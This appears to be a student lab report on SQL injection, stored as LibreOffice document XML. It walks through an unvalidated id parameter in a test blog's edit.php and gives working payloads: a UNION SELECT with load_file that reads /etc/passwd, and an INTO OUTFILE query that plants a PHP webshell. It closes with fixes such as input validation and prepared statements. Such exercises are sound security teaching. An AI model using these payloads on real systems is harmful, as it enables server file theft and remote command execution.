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en" fo:country="US" fo:font-weight="bold" officeooo:rsid="000a6a5e" officeooo:paragraph-rsid="000a6a5e" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000a6a5e" officeooo:paragraph-rsid="000a6a5e" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000a6a5e" officeooo:paragraph-rsid="000adf5f" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000a6a5e" officeooo:paragraph-rsid="0015c139" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000bf5ea" officeooo:paragraph-rsid="000bf5ea" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000bf5ea" officeooo:paragraph-rsid="000c7823" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000c7823" officeooo:paragraph-rsid="000c7823" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000dbe93" officeooo:paragraph-rsid="000dbe93" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="0014a576" officeooo:paragraph-rsid="0015c139" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="0015c139" officeooo:paragraph-rsid="0015c139" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000dbe93"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000dbe93" officeooo:paragraph-rsid="000dbe93"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000f282d" officeooo:paragraph-rsid="00110ecb"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00110ecb" officeooo:paragraph-rsid="00110ecb"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000adf5f"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="000bf5ea"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="000c7823"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000dbe93" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="000c7823" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:language="en" fo:country="US" fo:font-weight="normal" officeooo:rsid="00110ecb" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="0015c1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2- SQL injection</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">1)</text:p>
      <text:p text:style-name="P2">The <text:span text:style-name="T2">unique</text:span> vulnerabilit<text:span text:style-name="T2">y</text:span> that we have found are both located in the /admin/index.php page. This page contains a table of the posts stored on the database, this table has 3 columns: the first contains a link to the post, the second shows a link to edit page and the third contains a link that delete the selected row from the database.</text:p>
      <text:p text:style-name="P2">All those 3 links have the format “pathToFunctionPage.php/?id=n_id”.</text:p>
      <text:p text:style-name="P3">If in the second we replace the number of the id with a string ( like “a” for example) and then we click on them, the following page will report the error: “mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /<text:span text:style-name="T2">var/www</text:span>/<text:span text:style-name="T2">classes/post</text:span>.php”.</text:p>
      <text:p text:style-name="P3">This means that the back-end code d<text:span text:style-name="T1">oesn' t validate the id parameter that it receive in input, so that parameter can be exploited to add some custom SQL code to the associated query.</text:span> <text:s/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">If we try to do the same thing with the first link, after clicking it the page shows the error: “ERROR: INTEGER REQUIRED”. This means that the id parameter is correctly validated by the back-end code, so we can assume that the first link is not vulnerable.</text:span></text:p>
      <text:p text:style-name="P5">The same thing happens also for the third link, we have tried to inject some sql code but it didn' t work. </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">2)</text:p>
      <text:p text:style-name="P6">The goal of the edit.php page is to edit the post associated to the given id. When the page is loaded, it has to find in the database the post with the right id, and load all its <text:span text:style-name="T3">columns in the text fields of the page. After those considerations, We can guess that the query executed by the page looks like that: “SELECT * FROM posts WHERE id=$id ;”</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:span text:style-name="T3">3)</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T3">We easily exploited the previous vulnerability to get the /etc/passwd file on the server, we have simply replaced:</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T3">“&lt;a href="edit.php?id=1"&gt;edit&lt;/a&gt;”</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T3">with:</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T3"><text:s/>“&lt;a href="edit.php?id=1 UNION SELECT 0,'/etc/passwd',load_file('/etc/passwd'),true ORDER BY id; --"&gt;edit&lt;/a&gt;” </text:span><text:s/></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7">Now, clicking on the modified link, it will appear the edit.php page with the /etc/passwd file showed on the text area.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">4)</text:p>
      <text:p text:style-name="P8">To inject the webshell ( we used the suggested &lt;?php system($_GET['c']);?&gt; ) into the writing directory /css, we can exploit again <text:s/>the previous vulnerability replacing:</text:p>
      <text:p text:style-name="P8">“<text:span text:style-name="T3">&lt;a href="edit.php?id=1"&gt;edit&lt;/a&gt;</text:span>”</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T5">with:</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T5">“</text:span><text:span text:style-name="T6">&lt;a href="</text:span><text:span text:style-name="T5">edit.php?id=1 UNION SELECT 0,'a','&lt;?php system($_GET[\'c\']);?&gt;',true INTO OUTFILE '/var/www/css/webshell.php' --</text:span><text:span text:style-name="T6">"&gt;edit&lt;/a&gt;</text:span><text:span text:style-name="T5">”</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P12"><text:span text:style-name="T4">The webshell &lt;?php system($_GET['c']);?&gt; is a simple php program that execute on the system all the commands given through the GET parameter 'c', so for example to execute the “ls -l” command is we have just to load the page “css/webshell.php?c=ls -l”, the output of that command will be showed into the page.</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:span text:style-name="T4">5)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T4">To fix this issue it would be enough to validate the id input on the php function that performs the post search on the database. In th</text:span><text:span text:style-name="T7">is</text:span><text:span text:style-name="T4"> case the id parameter has to be a </text:span><text:span text:style-name="T7">non-negative</text:span><text:span text:style-name="T4"> number, so </text:span><text:span text:style-name="T7">it will </text:span><text:soft-page-break/><text:span text:style-name="T7">be enough check the $id variable through the function preg_match('/^[0-9]+$/',$id), it will return true if the $id is a number.</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14"><text:span text:style-name="T4">6)</text:span></text:p>
      <text:p text:style-name="P9">There are some good general behaviours that should be followed to avoid SQL-injection vulner<text:span text:style-name="T8">a</text:span>bilities in our systems. The gold rule is do not trust the user input, so in our code we should always validate the variables that come from a user input before to use them, for example if we expect like before to get a integer value from the $id variable, we can test its content and return an error if it contains characters different from numbers.</text:p>
      <text:p text:style-name="P9">Another example can be the validation of a string that will be used inside a SQL query, in this case we don' t want that the string contains characters like the “, ' , – or other special characters that belong to the SQL syntax because, <text:span text:style-name="T8">injected into ours query they will be interpreted by the database not as string, but as well as SQL special characters. The usual solution to that problem is to escape all the SQL special characters ( like “ or ' ) adding a slash before them ( so they become \” and \' ), alternately another solution is to create a whitelist/blacklist dictionary with all the words are allowed/forbidden, then check the input string keeping/removing only the words that match with the dictionary .</text:span></text:p>
      <text:p text:style-name="P10">The most of the programming languages already give to the programmers some built-in functions that make all that work for us, so generally it is preferable to use them instead of program custom function for the validation ( and risk to forget something). For the validation of a sql string parameter, for example, the built-in function usually look like this: <text:s text:c="2"/></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">…...</text:p>
      <text:p text:style-name="P10">…...</text:p>
      <text:p text:style-name="P10">String q=”SELECT * FROM table WHERE attr1=? and attr2=? ”;</text:p>
      <text:p text:style-name="P10">PreparedStatments s=conn.prepareStatement(q);</text:p>
      <text:p text:style-name="P10">s.setString(1,'value attr1');</text:p>
      <text:p text:style-name="P10">s.setString(2,'value attr2');</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">….</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">…..</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1:55:52.349000000</meta:creation-date>
    <dc:date>2015-05-07T15:04:44.002000000</dc:date>
    <meta:editing-duration>PT2H21M57S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>LibreOffice/4.2.4.2$Windows_x86 LibreOffice_project/63150712c6d317d27ce2db16eb94c2f3d7b699f8</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="36" meta:word-count="785" meta:character-count="4650" meta:non-whitespace-character-count="3892"/>
  </office:meta>
</office:document-meta>
</file>